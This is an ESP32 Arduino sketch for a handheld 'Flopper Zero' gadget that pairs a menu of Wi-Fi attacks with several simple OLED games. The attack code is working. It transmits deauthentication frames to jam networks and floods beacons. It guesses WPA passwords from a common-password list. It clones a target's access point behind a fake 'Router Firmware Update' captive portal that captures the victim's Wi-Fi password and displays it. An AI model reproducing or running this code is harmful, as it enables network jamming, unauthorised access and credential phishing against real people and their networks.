#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <WebServer.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Піни джойстика
#define JOY_X 34
#define JOY_Y 35
#define JOY_SW 32

const int joy_center_x = 2048;
const int joy_center_y = 2048;
const int JOY_DEADZONE = 600;

unsigned long last_input_time = 0;
const unsigned long INPUT_DEBOUNCE = 180; 
const unsigned long UI_REFRESH_INTERVAL = 40; 

enum MenuState { MAIN_MENU, GAMES_MENU };
MenuState current_state = MAIN_MENU;

// Головне хакерське меню
const char* menu_items[] = {
  "[ Marauder Menu ]",
  "WiFi Scan & Target", 
  "Deauth Jammer", 
  "PMKID Handshake", 
  "Beacon Spam", 
  "Probe Request Snif", 
  "Data Frame Snif", 
  "Air Traffic Speed",  
  "Wall of Sheep",     
  "Rickroll Spam",     
  "WPA Bruteforce",
  "Rogue AP Clone", 
  "Sour Apple iOS",
  "Swiftpair Spam",
  "Samsung BLE Spam",
  "Stealth Mode",
  "-> GO TO GAMES"
};
const int total_items = 17;
bool in_menu = false;

enum GameEngine { PLATFORMER, UNDERTALE, MINECRAFT, BIRD, SNAKE, PONG, INVADERS };

struct GameProfile {
  const char* name;
  GameEngine engine;
  float speed;
};

// Оптимізований каталог: рівно 1 унікальна гра на кожен тип
GameProfile games_catalog[] = {
  {"Micro Craft", MINECRAFT, 1.5},
  {"Mario Jump", PLATFORMER, 1.8},
  {"Sans Battle", UNDERTALE, 2.0},
  {"Cyber Bird", BIRD, 2.0},
  {"Toxic Snake", SNAKE, 1.5},
  {"Deep Space Pong", PONG, 2.5},
  {"Matrix Invaders", INVADERS, 1.0}
};
const int total_games_count = 7;

int cursor_pos = 1;
int window_start = 1;
const int MAX_VISIBLE_ITEMS = 4;

struct WifiTarget {
  String ssid; uint8_t bssid[6]; int channel; int rssi;
};
#define MAX_TARGETS 15
WifiTarget scan_targets[MAX_TARGETS];
int found_networks_count = 0;
int selected_target_index = -1;

// Глобальні змінні для Captive Portal
DNSServer dnsServer;
WebServer webServer(80);
String intercepted_password = "";

const char* world_popular_passwords[] = {
  "12345678", "password", "123456789", "123456", "1234567", "qwerty", 
  "password123", "11111111", "00000000", "123123", "admin", "letmein", 
  "iloveyou", "welcome", "shadow", "killer", "matrix2026", "esp32marauder", "flopper0", "wifi_guest"
};

const unsigned char PROGMEM flipper_icon[] = {
  0x00, 0x00, 0x07, 0xe0, 0x1f, 0xf8, 0x3f, 0xfc, 0x77, 0xee, 0x63, 0xc6, 0x60, 0x06, 0x6c, 0x36, 
  0x7f, 0xfe, 0x3f, 0xfc, 0x1f, 0xf8, 0x1f, 0xf8, 0x0d, 0xb0, 0x09, 0x90, 0x09, 0x90, 0x00, 0x00
};

uint8_t deauthPacket[] = { 0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
uint8_t beaconPacket[] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x04, 0x00, 0x00 };

bool mc_world[16][8]; 

void showWelcomeScreen();
void drawMainScreen();
void drawMenu();
void executeMarauderAction(int index);
void selectWifiTargetMenu();
void readJoystick(int &p_up, int &p_down, int &p_left, int &p_right, bool &btn_pressed);
void runUniversalEngine(GameProfile game);

// Обробники веб-сервера для фішингової сторінки
void handleCaptivePortal() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<style>body{font-family:sans-serif;background:#f4f4f4;text-align:center;padding:20px;}";
  html += ".box{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);max-width:400px;margin:auto;}";
  html += "h2{color:#333;}input[type=password]{width:90%;padding:10px;margin:15px 0;border:1px solid #ccc;border-radius:4px;}";
  html += "button{background:#0078d4;color:white;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;width:95%;font-size:16px;}</style></head>";
  html += "<body><div class='box'><h2>Router Firmware Update</h2>";
  html += "<p>A critical security update is available. Please enter your WPA2 Wi-Fi password to proceed with the installation.</p>";
  html += "<form action='/save' method='POST'>";
  html += "<input type='password' name='wifipass' placeholder='Wi-Fi Password' required minlength='8'><br>";
  html += "<button type='submit'>Update Firmware</button></form></div></body></html>";
  webServer.send(200, "text/html", html);
}

void handleSavePassword() {
  if (webServer.hasArg("wifipass")) {
    intercepted_password = webServer.arg("wifipass");
    Serial.println("\n[!] INTERCEPTED PASSWORD: " + intercepted_password);
    
    String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head>";
    html += "<body style='font-family:sans-serif;text-align:center;padding:40px;'>";
    html += "<h2>Update Started</h2><p>Password verified. Verification successful. Firmware is upgrading, please do not switch off your router.</p></body></html>";
    webServer.send(200, "text/html", html);
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(JOY_SW, INPUT_PULLUP);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { for(;;); }
  showWelcomeScreen();
  WiFi.mode(WIFI_STA); 
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect();
}

void readJoystick(int &p_up, int &p_down, int &p_left, int &p_right, bool &btn_pressed) {
  int raw_x = analogRead(JOY_X); 
  int raw_y = analogRead(JOY_Y);
  btn_pressed = (digitalRead(JOY_SW) == LOW);

  p_up = 0; p_down = 0; p_left = 0; p_right = 0;

  if (raw_y < (joy_center_y - JOY_DEADZONE)) p_down = 1;       
  else if (raw_y > (joy_center_y + JOY_DEADZONE)) p_up = 1;    
  else if (raw_x > (joy_center_x + JOY_DEADZONE)) p_right = 1; 
  else if (raw_x < (joy_center_x - JOY_DEADZONE)) p_left = 1;  
}

void loop() {
  int p_up, p_down, p_left, p_right; bool btn_pressed;
  readJoystick(p_up, p_down, p_left, p_right, btn_pressed);
  unsigned long current_time = millis();
  int max_items = (current_state == MAIN_MENU) ? total_items : total_games_count;

  if (!in_menu) {
    if (btn_pressed && (current_time - last_input_time > 300)) { 
      in_menu = true; cursor_pos = (current_state == MAIN_MENU) ? 1 : 0; window_start = (current_state == MAIN_MENU) ? 1 : 0; last_input_time = current_time;
    }
    static unsigned long last_draw = 0;
    if (current_time - last_draw > UI_REFRESH_INTERVAL) { drawMainScreen(); last_draw = current_time; }
  } else {
    if (current_time - last_input_time > INPUT_DEBOUNCE) {
      if (p_up) { 
        cursor_pos--;
        int min_pos = (current_state == MAIN_MENU ? 1 : 0);
        if (cursor_pos < min_pos) { cursor_pos = max_items - 1; window_start = max(min_pos, max_items - MAX_VISIBLE_ITEMS); }
        if (cursor_pos < window_start) window_start = cursor_pos;
        last_input_time = current_time;
      }
      else if (p_down) { 
        cursor_pos++;
        if (cursor_pos >= max_items) { cursor_pos = (current_state == MAIN_MENU ? 1 : 0); window_start = (current_state == MAIN_MENU ? 1 : 0); }
        if (cursor_pos >= window_start + MAX_VISIBLE_ITEMS) { window_start = cursor_pos - MAX_VISIBLE_ITEMS + 1; }
        last_input_time = current_time;
      }
      else if (btn_pressed) { 
        last_input_time = current_time;
        if (current_state == MAIN_MENU) {
          if (cursor_pos == total_items - 1) { current_state = GAMES_MENU; cursor_pos = 0; window_start = 0; }
          else { executeMarauderAction(cursor_pos); }
        } else {
          runUniversalEngine(games_catalog[cursor_pos]);
        }
      }
      else if (p_right) { 
        if (current_state == GAMES_MENU) { current_state = MAIN_MENU; cursor_pos = 1; window_start = 1; }
        else { in_menu = false; }
        last_input_time = current_time;
      }
    }
    if (in_menu) drawMenu();
  }
}

void showWelcomeScreen() {
  display.clearDisplay(); display.drawRect(0, 0, 128, 64, SSD1306_WHITE);
  display.setTextSize(2); display.setCursor(26, 16); display.print(F("FLOPPER"));
  display.setCursor(40, 36); display.print(F("ZERO")); display.display(); delay(1000);
}

void drawMainScreen() {
  display.clearDisplay(); display.drawRect(0, 0, 128, 64, SSD1306_WHITE);
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(10, 12); display.print(F("FLOPPER: READY"));
  display.setCursor(10, 24);
  if (selected_target_index == -1) display.print(F("TARGET: [ALL APs]"));
  else display.printf("TARGET: %s", scan_targets[selected_target_index].ssid.substring(0, 10).c_str());
  display.setCursor(10, 36); display.printf("%d REAL GAMES", total_games_count);
  display.drawBitmap(98, 12, flipper_icon, 16, 16, SSD1306_WHITE); display.display();
}

void drawMenu() {
  display.clearDisplay(); display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(15, 2);
  display.print(current_state == MAIN_MENU ? F("MARAUDER SYSTEMS") : F("RETRO GAMES"));
  display.drawFastHLine(0, 13, 128, SSD1306_WHITE);

  int items_limit = (current_state == MAIN_MENU) ? total_items : total_games_count;
  int start_idx = window_start;

  for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
    int item_index = start_idx + i; if (item_index >= items_limit) break;
    int row_y = 16 + (i * 11);
    if (item_index == cursor_pos) {
      display.fillRect(2, row_y - 1, 124, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK);
    } else { display.setTextColor(SSD1306_WHITE); }
    display.setCursor(6, row_y);
    if (current_state == MAIN_MENU) display.print(menu_items[item_index]);
    else display.printf("%d. %s", item_index + 1, games_catalog[item_index].name);
  }
  display.display();
}

void runUniversalEngine(GameProfile game) {
  bool playing = true; int score = 0; unsigned long last_tick = 0;
  int mc_steve_x = 24, mc_steve_y = 32;
  for(int x=0; x<16; x++) { for(int y=0; y<8; y++) { mc_world[x][y] = (y >= 5); } }
  float plat_player_y = 45.0, plat_vel_y = 0.0; int plat_box_x = 128;
  int ut_heart_x = 64, ut_heart_y = 40, ut_bone_x = 128, ut_bone_y = 38;
  float b_y = 32.0, b_vel = 0.0; int f_x = random(4, 120), f_y = random(16, 60);
  int s_x[20] = {32}, s_y[20] = {32}, s_len = 3, s_dir = 1;
  int p_y = 24, cpu_y = 24, ball_x = 64, ball_y = 32, b_dx = 2, b_dy = 1;
  int ship_x = 60, laser_x = -1, laser_y = -1, alien_x = 10, alien_y = 16, al_dir = 1;

  while(playing) {
    unsigned long current_time = millis();
    int p_up, p_down, p_left, p_right; bool btn_pressed;
    readJoystick(p_up, p_down, p_left, p_right, btn_pressed);
    if (p_right) { delay(200); break; }
    if (current_time - last_tick > (45 / game.speed)) {
      last_tick = current_time;
      display.clearDisplay(); display.setTextColor(SSD1306_WHITE);
      display.setCursor(2, 2); display.print(game.name);

      if (game.engine == MINECRAFT) {
        if (p_left) mc_steve_x -= 2;
        if (p_down) mc_steve_y += 2;
        if (p_up) mc_steve_y -= 2;
        mc_steve_x = constrain(mc_steve_x, 0, 120);
        int tile_x = (mc_steve_x + 3) / 8; int tile_y = (mc_steve_y + 6) / 8;
        if (tile_y < 8 && !mc_world[tile_x][tile_y]) mc_steve_y += 2;
        if (btn_pressed) {
          int front_tile = (mc_steve_x + 10) / 8;
          if (front_tile < 16 && tile_y < 8) { mc_world[front_tile][tile_y] = !mc_world[front_tile][tile_y]; score++; }
        }
        for(int x=0; x<16; x++) {
          for(int y=0; y<8; y++) { if (mc_world[x][y]) display.fillRect(x * 8, y * 8, 7, 7, SSD1306_WHITE); }
        }
        display.drawRect(mc_steve_x, mc_steve_y, 5, 8, SSD1306_WHITE);
      }
      else if (game.engine == PLATFORMER) {
        if (btn_pressed || p_up) { if (plat_player_y >= 45.0) plat_vel_y = -4.0; }
        plat_vel_y += 0.4; plat_player_y += plat_vel_y;
        if (plat_player_y > 45.0) { plat_player_y = 45.0; plat_vel_y = 0; }
        plat_box_x -= 3; if (plat_box_x < -8) { plat_box_x = 128; score++; }
        if (plat_box_x > 20 && plat_box_x < 28 && plat_player_y > 38) playing = false;
        display.drawFastHLine(0, 50, 128, SSD1306_WHITE);
        display.fillRect(20, (int)plat_player_y, 6, 5, SSD1306_WHITE); display.fillRect(plat_box_x, 42, 6, 8, SSD1306_WHITE);
      }
      else if (game.engine == UNDERTALE) {
        if (p_down) ut_heart_y += 2;
        if (p_up) ut_heart_y -= 2;
        ut_heart_y = constrain(ut_heart_y, 24, 52);
        ut_bone_x -= 2; if (ut_bone_x < 36) { ut_bone_x = 92; ut_bone_y = random(24, 48); score++; }
        if (ut_bone_x >= ut_heart_x - 3 && ut_bone_x <= ut_heart_x + 3 && abs(ut_heart_y - ut_bone_y) < 6) playing = false;
        display.drawRect(34, 20, 60, 40, SSD1306_WHITE);
        display.fillRect(ut_heart_x, ut_heart_y, 3, 3, SSD1306_WHITE); display.drawFastVLine(ut_bone_x, ut_bone_y, 10, SSD1306_WHITE);
      }
      else if (game.engine == BIRD) {
        if (btn_pressed || p_up) b_vel = -2.8; b_vel += 0.3; b_y += b_vel;
        f_x -= 2; if (f_x < -10) { f_x = 128; f_y = random(10, 45); score++; }
        if (b_y > 60 || b_y < 0) playing = false;
        if (f_x < 20 && f_x > 10 && (b_y < f_y || b_y > f_y + 24)) playing = false;
        display.fillRect(16, (int)b_y, 4, 4, SSD1306_WHITE);
        display.fillRect(f_x, 0, 10, f_y, SSD1306_WHITE); display.fillRect(f_x, f_y + 24, 10, 64, SSD1306_WHITE);
      }
      else if (game.engine == SNAKE) {
        if (p_down) s_dir = 2; else if (btn_pressed || p_up) s_dir = 0;
        for(int i=s_len-1; i>0; i--) { s_x[i]=s_x[i-1]; s_y[i]=s_y[i-1]; }
        if(s_dir==2) s_y[0]+=3; else if(s_dir==0) s_y[0]-=3; else s_x[0]+=3;
        if(abs(s_x[0]-f_x)<5 && abs(s_y[0]-f_y)<5) { score++; f_x=random(10,110); f_y=random(15,55); if(s_len<20) s_len++; }
        if(s_x[0]<0||s_x[0]>124||s_y[0]<12||s_y[0]>60) playing=false;
        for(int i=0; i<s_len; i++) display.fillRect(s_x[i], s_y[i], 3, 3, SSD1306_WHITE);
        display.fillRect(f_x, f_y, 3, 3, SSD1306_WHITE);
      }
      else if (game.engine == PONG) {
        if (p_down) p_y += 2; if (btn_pressed || p_up) p_y -= 2;
        ball_x += b_dx; ball_y += b_dy; if (ball_y < 14 || ball_y > 60) b_dy = -b_dy;
        if (cpu_y + 4 < ball_y) cpu_y += 1; else cpu_y -= 1;
        if (ball_x < 8 && abs(ball_y - p_y) < 12) { b_dx = -b_dx; score++; }
        if (ball_x > 120) b_dx = -b_dx; if (ball_x < 0) playing = false;
        display.fillRect(4, p_y, 3, 12, SSD1306_WHITE); display.fillRect(122, cpu_y, 3, 12, SSD1306_WHITE);
        display.fillRect(ball_x, ball_y, 3, 3, SSD1306_WHITE);
      }
      else if (game.engine == INVADERS) {
        if (p_left) ship_x -= 3; else if (p_down) ship_x += 3;
        if ((btn_pressed || p_up) && laser_y == -1) { laser_x = ship_x + 4; laser_y = 52; }
        if (laser_y >= 12) { laser_y -= 4; if (abs(laser_x - alien_x) < 12 && abs(laser_y - alien_y) < 8) { score++; laser_y = -1; alien_y = 14; alien_x = random(10, 100); } } else { laser_y = -1; }
        alien_x += al_dir; if (alien_x > 110 || alien_x < 5) { al_dir = -al_dir; alien_y += 3; } if (alien_y > 50) playing = false;
        display.fillRect(ship_x, 56, 10, 5, SSD1306_WHITE); display.fillRect(alien_x, alien_y, 10, 6, SSD1306_WHITE);
        if (laser_y != -1) display.drawFastVLine(laser_x, laser_y, 4, SSD1306_WHITE);
      }
      display.setCursor(95, 2); display.printf("S:%d", score); display.display();
    }
    yield();
  }
  display.clearDisplay(); display.setTextSize(2); display.setCursor(12, 20); display.print(F("GAME OVER")); display.display(); delay(1200);
}

void selectWifiTargetMenu() {
  display.clearDisplay(); display.setCursor(15, 25); display.print(F("Scanning air...")); display.display();

  found_networks_count = WiFi.scanNetworks();
  if (found_networks_count > MAX_TARGETS) found_networks_count = MAX_TARGETS;
  for (int i = 0; i < found_networks_count; i++) {
    scan_targets[i].ssid = WiFi.SSID(i);
    scan_targets[i].channel = WiFi.channel(i);
    scan_targets[i].rssi = WiFi.RSSI(i);
    memcpy(scan_targets[i].bssid, WiFi.BSSID(i), 6);
  }
  WiFi.scanDelete();

  int sub_cursor = 0, sub_window = 0; unsigned long last_sub_input = 0;
  while (true) {
    unsigned long current_time = millis(); int p_up, p_down, p_left, p_right; bool btn_pressed;
    readJoystick(p_up, p_down, p_left, p_right, btn_pressed);
    if (current_time - last_sub_input > INPUT_DEBOUNCE) {
      if (p_up) {
        sub_cursor--;
        if (sub_cursor < 0) sub_cursor = found_networks_count;
        if (sub_cursor < sub_window) sub_window = sub_cursor;
        last_sub_input = current_time;
      }
      else if (p_down) {
        sub_cursor++;
        if (sub_cursor > found_networks_count) sub_cursor = 0;
        if (sub_cursor >= sub_window + 4) sub_window = sub_cursor - 3;
        if (sub_cursor == 0) sub_window = 0;
        last_sub_input = current_time;
      }
      else if (btn_pressed) { selected_target_index = (sub_cursor == 0) ? -1 : (sub_cursor - 1); break; }
      else if (p_right) { break; }
    }
    static unsigned long last_sub_draw = 0;
    if (current_time - last_sub_draw > UI_REFRESH_INTERVAL) {
      display.clearDisplay(); display.setCursor(15, 2); display.print(F("[ SELECT TARGET ]")); display.drawFastHLine(0, 11, 128, SSD1306_WHITE); int row_y = 14;
      if (sub_cursor == 0) { display.fillRect(2, row_y - 1, 124, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); } else { display.setTextColor(SSD1306_WHITE); }
      display.setCursor(4, row_y); display.print(F("-> JAM ALL CONNECTIONS"));
      for (int i = 0; i < 3; i++) {
        int idx = sub_window + i; if (idx >= found_networks_count) break;
        row_y = 25 + (i * 11);
        if ((idx + 1) == sub_cursor) { display.fillRect(2, row_y - 1, 124, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); } else { display.setTextColor(SSD1306_WHITE); }
        display.setCursor(4, row_y); display.printf("%d:%s (Ch:%d)", idx + 1, scan_targets[idx].ssid.substring(0, 10).c_str(), scan_targets[idx].channel);
      }
      display.display(); last_sub_draw = current_time;
    }
    yield();
  }
}

void executeMarauderAction(int index) {
  if (index == 1) { selectWifiTargetMenu(); return; }

  if (index == 15) {
    display.clearDisplay(); display.ssd1306_command(SSD1306_DISPLAYOFF);
    while(digitalRead(JOY_SW) == HIGH) { delay(50); yield(); }
    display.ssd1306_command(SSD1306_DISPLAYON); delay(300); return;
  }

  // Ініціалізація та конфігурація Rogue AP Clone + Captive Portal
  if (index == 11) {
    display.clearDisplay();
    if (selected_target_index == -1) {
      display.setCursor(0, 20); display.print("Error:\nSelect Target first!"); display.display();
      delay(2000); return;
    }

    intercepted_password = ""; 
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();

    IPAddress apIP(172, 217, 28, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(scan_targets[selected_target_index].ssid.c_str(), NULL, scan_targets[selected_target_index].channel);

    dnsServer.start(53, "*", apIP);

    webServer.on("/save", HTTP_POST, handleSavePassword);
    webServer.onNotFound(handleCaptivePortal);
    webServer.begin();
  } else {
    esp_wifi_set_promiscuous(true);
  }

  unsigned long last_ui_time = 0, last_sec_time = 0, last_tx_time = 0;
  int current_channel = (selected_target_index != -1) ? scan_targets[selected_target_index].channel : 1;
  int brute_idx = 0;
  bool brute_success = false;

  if (index != 11) esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);

  while (true) {
    unsigned long current_time = millis(); int p_up, p_down, p_left, p_right; bool btn_pressed;
    readJoystick(p_up, p_down, p_left, p_right, btn_pressed);
    if (btn_pressed || p_right) { delay(200); break; }

    if (index == 11) {
      dnsServer.processNextRequest();
      webServer.handleClient();
    }

    if (current_time - last_tx_time > 100) {
      last_tx_time = current_time;
      if (index == 2) {
        if (selected_target_index != -1) memcpy(&deauthPacket, scan_targets[selected_target_index].bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      }
      else if (index == 4 || index == 9) {
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
      }
    }

    if (index == 10 && current_time - last_sec_time > 2000 && !brute_success) {
      last_sec_time = current_time;
      if (selected_target_index != -1) {
        esp_wifi_set_promiscuous(false); WiFi.disconnect();
        WiFi.begin(scan_targets[selected_target_index].ssid.c_str(), world_popular_passwords[brute_idx]);
        long start_auth = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - start_auth < 1500) { yield(); }
        if (WiFi.status() == WL_CONNECTED) { brute_success = true; }
        else {
          brute_idx++; if (brute_idx >= 20) brute_idx = 0;
          esp_wifi_set_promiscuous(true); esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
        }
      }
    }

    int stations_connected = 0;
    if (index == 11 && current_time - last_sec_time > 1000) {
      last_sec_time = current_time;
      wifi_sta_list_t wifi_sta_list;
      esp_wifi_ap_get_sta_list(&wifi_sta_list);
      stations_connected = wifi_sta_list.num;
    }

    if (current_time - last_ui_time > 200) {
      display.clearDisplay(); display.setTextColor(SSD1306_WHITE);
      if (index == 2) display.printf("!! JAMMER !!\nCh: %d\nSending Deauth...", current_channel);
      else if (index == 4) display.printf("[ BEACON SPAM ]\nFlooding air...");
      else if (index == 9) display.printf("[ RICKROLL SPAM ]\nNever gonna give...");
      else if (index == 10) {
        if (selected_target_index == -1) display.print("Error:\nSelect Target first!");
        else {
          display.printf("[ BRUTEFORCE ]\nSSID: %s\nTry: %d/20\nPass: %s", scan_targets[selected_target_index].ssid.substring(0,10).c_str(), brute_idx+1, world_popular_passwords[brute_idx]);
          if(brute_success) display.print("\n\nSUCCESS! CONNECTED!");
        }
      }
      else if (index == 11) {
        display.printf("[ AP CLONE + PORTAL ]\nVictims: %d\n", stations_connected);
        if (intercepted_password != "") {
          display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
          display.printf("PWD: %s", intercepted_password.c_str());
        } else {
          display.print("Waiting for password...");
        }
      }
      else display.printf("System Working...\nMode: %s\nLogs -> Serial UART", menu_items[index]);
      display.display(); last_ui_time = current_time;
    }
    yield();
  }

  if (index == 11) {
    webServer.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
  }
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect();
}
